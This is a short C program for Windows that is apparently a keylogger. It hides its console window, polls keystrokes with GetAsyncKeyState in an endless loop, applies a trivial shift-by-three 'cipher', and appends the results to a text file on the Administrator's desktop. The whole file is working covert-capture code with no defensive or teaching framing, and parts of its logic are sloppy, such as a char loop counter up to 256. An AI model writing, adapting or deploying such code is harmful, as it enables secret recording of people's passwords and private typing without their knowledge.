#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <conio.h>

void hidewindow();
FILE *fp,*fn;

int main()
{
    hidewindow();
    char capture;
    char cipher;

    while(1)
    {
        for(capture=0;capture<=256;capture++)
        {
        if(GetAsyncKeyState(capture)== -32767)
        {
            fp=fopen("C:\\Users\\Administrator\\Desktop\\Record.txt","a+");
            fn=fopen("Signal.txt","w");
            fprintf(fn,"\nKeylogging System halt......... !");
                fclose(fn);
            cipher=toascii(capture)+3;
            if(toascii(cipher)==30)
                {
                    system("Signal.txt");
                    exit(0);
                }
            else if(toascii(cipher)==16)
                {
                fprintf(fp,"\n");
                }
            else if(toascii(cipher)==11)
                fprintf(fp,"<");

                fprintf(fp,"%c",cipher);

                fclose(fp);

        }

        }
    }

    return 0;
}

void hidewindow()
{
    HWND Stealth;
    AllocConsole();
    Stealth=FindWindowA("ConsoleWindowClass",0);
    ShowWindow(Stealth,0);

}
